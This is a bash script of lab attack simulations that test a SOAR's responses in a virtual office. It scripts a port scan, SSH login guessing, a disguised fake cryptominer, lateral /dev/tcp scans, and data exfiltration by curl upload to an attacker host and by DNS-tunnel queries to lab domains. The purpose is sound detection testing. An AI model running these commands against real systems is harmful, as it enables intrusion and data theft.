#!/usr/bin/env bash
# Lab-only attack simulations on the vSphere office. Each scenario runs the "attack" on the
# right host (office VMs through SSM, the Kali attacker over SSH) and prints what the SOAR
# should do about it.
#
#   scenarios.sh prepare          once: tools and listeners on the attacker VM
#   scenarios.sh external-scan    attacker scans the office      -> tier 2: block source at the firewall
#   scenarios.sh ssh-bruteforce   attacker guesses SSH logins     -> tier 2: block source (after 10 failures)
#   scenarios.sh cryptominer      ws01 runs a fake miner          -> tier 3: isolate ws01
#   scenarios.sh lateral          ws01 scans/SSHes inside office  -> tier 3: isolate ws01
#   scenarios.sh exfiltration     srv01 archives + uploads data   -> tier 3: isolate srv01 (+ tier 1 volume/DNS)
#   scenarios.sh soft-signals     ws01: big upload + DNS tunnel, no tell-tale process -> tier 1 only
#   scenarios.sh normal-traffic   ordinary browsing/DNS for the baseline
set -euo pipefail
cd "$(dirname "$0")/.."
export AWS_PAGER=""

# The attacker sits on the netlab WAN, outside the office, and attacks fw01's WAN address.
# The attacker has a DHCP address: govc vm.ip <folder>/attacker shows it.
FW=192.168.121.10
ATTACKER=${ATTACKER:-192.168.121.139}

# Office VMs are SSM managed nodes (terraform/office registers them), found by their Name tag.
instance() {
  local id
  for id in $(aws ssm describe-instance-information --filters Key=tag:Name,Values="$1" \
      --query 'InstanceInformationList[?PingStatus==`Online`].InstanceId' --output text); do
    echo "$id"; return
  done
  echo "no online managed node named $1" >&2; exit 1
}

run_on() { # run_on <host> <comment> <script>
  local id cmd status
  if [ "$1" = attacker ]; then  # not managed by the company: plain SSH
    echo "[attacker] $2"
    ssh -o ConnectTimeout=10 "student@$ATTACKER" sudo bash -s <<<"$3" | tail -5
    return
  fi
  id=$(instance "$1")
  cmd=$(aws ssm send-command --instance-ids "$id" --document-name AWS-RunShellScript --comment "$2" \
    --parameters "$(python3 -c 'import json,sys; print(json.dumps({"commands": [sys.argv[1]], "executionTimeout": ["900"]}))' "$3")" \
    --query Command.CommandId --output text)
  echo "[$1] $2 (command $cmd)"
  for _ in $(seq 1 90); do
    status=$(aws ssm get-command-invocation --command-id "$cmd" --instance-id "$id" --query Status --output text 2>/dev/null || true)
    case $status in Success|Failed|Cancelled|TimedOut) break ;; esac
    sleep 5
  done
  echo "[$1] $status"
  aws ssm get-command-invocation --command-id "$cmd" --instance-id "$id" --query StandardOutputContent --output text | tail -5
}

case "${1:-}" in
  prepare)
    run_on attacker "SIM prepare attacker" "$(cat simulations/attacker-setup.sh)" ;;
  external-scan)
    run_on attacker "SIM external scan" "nmap -Pn -sS -T4 --max-retries 1 -p 1-200 $FW | tail -5" ;;
  ssh-bruteforce)
    # The office allows SSH keys only, so password guessing (hydra) stops at once (found 6 November).
    # The attacker still tries user names: sshd logs each attempt, and that is what the alarm counts.
    run_on attacker "SIM ssh brute force" "for r in 1 2; do for u in admin root oracle test guest ubuntu postgres backup deploy git ftp web; do
timeout 6 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=3 \$u@$FW true 2>/dev/null; done; done; echo '24 login attempts sent'" ;;
  cryptominer)
    run_on ws01 "SIM cryptominer" "cp /usr/bin/python3 /tmp/xmrig && nohup /tmp/xmrig -c '
import socket, time, json
end = time.time() + 120
try:
    s = socket.create_connection((\"$ATTACKER\", 3333), timeout=10)
    s.send((json.dumps({\"id\": 1, \"method\": \"login\", \"params\": {\"login\": \"lab-wallet\", \"pass\": \"x\", \"agent\": \"XMRig/6.21\"}}) + \"\\n\").encode())
except OSError as e:
    print(\"pool unreachable\", e)
while time.time() < end:
    sum(i * i for i in range(100000))
' >/tmp/xmrig.log 2>&1 & sleep 3; pgrep -a xmrig" ;;
  lateral)
    run_on ws01 "SIM lateral movement" "for h in 10.10.20.10 10.10.10.12 10.10.0.10; do (exec 3<>/dev/tcp/\$h/22 && sleep 40) & done
for p in \$(seq 20 60); do (timeout 20 bash -c \"exec 3<>/dev/tcp/10.10.20.10/\$p\" 2>/dev/null &) ; done
sleep 25; echo scanned" ;;
  exfiltration)
    run_on srv01 "SIM data exfiltration" "mkdir -p /srv/finance && head -c 60M /dev/urandom > /srv/finance/ledger-2026.db
tar czf /tmp/finance.tgz /srv/finance 2>/dev/null
timeout 90 curl -s -T /tmp/finance.tgz --max-time 80 http://$ATTACKER:8080/upload || true
for i in \$(seq 1 30); do dig +short +tries=1 +time=1 \$(head -c 30 /dev/urandom | base32 | tr -d '=' | tr 'A-Z' 'a-z').files.exfil-lab.net >/dev/null || true; done
rm -rf /srv/finance /tmp/finance.tgz; echo exfil done" ;;
  soft-signals)
    run_on ws01 "SIM soft signals" "python3 -c '
import os, socket, time
s = socket.create_connection((\"$ATTACKER\", 8080), timeout=10)
end = time.time() + 75
while time.time() < end:
    s.sendall(os.urandom(1 << 20))
' || true
for i in \$(seq 1 25); do dig +short +tries=1 +time=1 \$(head -c 30 /dev/urandom | base32 | tr -d '=' | tr 'A-Z' 'a-z').cdn.tunnel-lab.net >/dev/null || true; done; echo soft done" ;;
  normal-traffic)
    for h in ws01 srv01; do
      run_on "$h" "SIM normal traffic" "for i in \$(seq 1 20); do curl -s -o /dev/null https://www.wikipedia.org; dig +short example.com >/dev/null; curl -s -o /dev/null http://app.cloud.innovatech.internal/items; sleep 3; done; echo ok"
    done ;;
  *)
    sed -n '2,14p' "$0"; exit 1 ;;
esac
